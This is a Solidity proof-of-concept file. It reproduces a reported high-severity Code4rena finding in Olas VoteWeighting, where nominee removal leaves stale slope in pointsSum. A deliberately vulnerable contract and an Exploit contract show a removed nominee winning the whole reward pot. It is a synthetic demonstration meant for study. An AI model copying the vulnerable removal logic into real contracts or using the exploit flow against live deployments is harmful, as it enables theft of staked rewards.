// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Olas VoteWeighting — removeNominee and revokeRemovedNomineeVotingPower
    update bias and do not update pointsSum.slope (Code4rena H-01, finding 34920).
    SYNTHETIC, cheatcode-free. One checkpoint, no week roll.
    Root cause: a vote adds the slope to pointsSum and to the nominee.
    Removal zeroes the nominee's bias and rewrites pointsSum.bias, then
    revoke clears the user's record. Neither write subtracts the slope.
    The removed nominee still has slope 100e18 against an honest 40e18,
    so the removed nominee still wins the 140e18 reward. Fair power is 40e18
    and the honest nominee should win. */

contract OLAS {
    string public name = "Autonolas";
    string public symbol = "OLAS";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract GoodNominee {}

contract VoteWeighting {
    struct Point {
        uint256 bias;
        uint256 slope;
    }

    OLAS public token;
    address public owner;
    Point public pointsSum;
    mapping(bytes32 => Point) public pointsWeight;
    mapping(bytes32 => address) public payee;
    mapping(bytes32 => bool) public removed;
    mapping(address => mapping(bytes32 => uint256)) public votedSlope;
    bytes32[] public nominees;
    bytes32 public lastWinner;
    uint256 public lastPower;
    uint256 public lastReward;

    constructor(address _token, address _owner) {
        token = OLAS(_token);
        owner = _owner;
    }

    function addNominee(bytes32 nominee, address _payee) external {
        nominees.push(nominee);
        payee[nominee] = _payee;
    }

    function vote(bytes32 nominee, uint256 slope, uint256 bias) external {
        votedSlope[msg.sender][nominee] += slope;
        pointsWeight[nominee].slope += slope;
        pointsWeight[nominee].bias += bias;
        pointsSum.slope += slope;
        pointsSum.bias += bias;
    }

    function removeNominee(bytes32 nominee) external virtual {
        require(msg.sender == owner, "owner");
        uint256 oldWeight = pointsWeight[nominee].bias;
        uint256 oldSum = pointsSum.bias;
        pointsWeight[nominee].bias = 0;
        uint256 newSum = oldSum - oldWeight;
        pointsSum.bias = newSum;
        // @> VULN: bias was rewritten and this slope is not subtracted from pointsSum.slope
        lastPower = pointsWeight[nominee].slope;
        // FIX: pointsSum.slope -= pointsWeight[nominee].slope; pointsWeight[nominee].slope = 0;
        removed[nominee] = true;
    }

    function revokeRemovedNomineeVotingPower(bytes32 nominee) external virtual {
        require(removed[nominee], "not removed");
        votedSlope[msg.sender][nominee] = 0;
    }

    function payout() external returns (uint256 power) {
        power = pointsSum.slope;
        bytes32 winner = nominees[0];
        for (uint256 i = 1; i < nominees.length; i++) {
            if (pointsWeight[nominees[i]].slope > pointsWeight[winner].slope) {
                winner = nominees[i];
            }
        }
        lastWinner = winner;
        lastPower = power;
        uint256 reward = token.balanceOf(address(this));
        lastReward = reward;
        token.transfer(payee[winner], reward);
    }
}

contract Exploit {
    uint256 public constant BAD_SLOPE = 100e18;
    uint256 public constant GOOD_SLOPE = 40e18;
    uint256 public constant POT = 140e18;
    bytes32 public constant BAD = bytes32(uint256(1));
    bytes32 public constant GOOD = bytes32(uint256(2));

    OLAS public olas; // nonce 1
    GoodNominee public goodNominee; // nonce 2
    VoteWeighting public weighting; // nonce 3

    uint256 public remainingPower;
    uint256 public fairPower;
    bytes32 public winner;
    uint256 public rewardPaid;
    uint256 public honestPaid;

    constructor() {
        olas = new OLAS();
        goodNominee = new GoodNominee();
        weighting = new VoteWeighting(address(olas), address(this));
        weighting.addNominee(BAD, address(this));
        weighting.addNominee(GOOD, address(goodNominee));
        olas.mint(address(weighting), POT);
    }

    function run() external {
        weighting.vote(BAD, BAD_SLOPE, BAD_SLOPE);
        weighting.vote(GOOD, GOOD_SLOPE, GOOD_SLOPE);

        weighting.removeNominee(BAD);
        weighting.revokeRemovedNomineeVotingPower(BAD);

        (, uint256 slopeAfter) = weighting.pointsSum();
        remainingPower = slopeAfter;
        fairPower = GOOD_SLOPE;
        require(remainingPower == BAD_SLOPE + GOOD_SLOPE, "slope was reduced");
        require(fairPower == GOOD_SLOPE, "fair power");

        weighting.payout();
        winner = weighting.lastWinner();
        rewardPaid = olas.balanceOf(address(this));
        honestPaid = olas.balanceOf(address(goodNominee));
        require(winner == BAD, "removed nominee did not win");
        require(rewardPaid == POT, "reward did not follow the stale slope");
        require(honestPaid == 0, "honest nominee was paid");
        require(remainingPower > fairPower, "power did not stay high");
    }
}
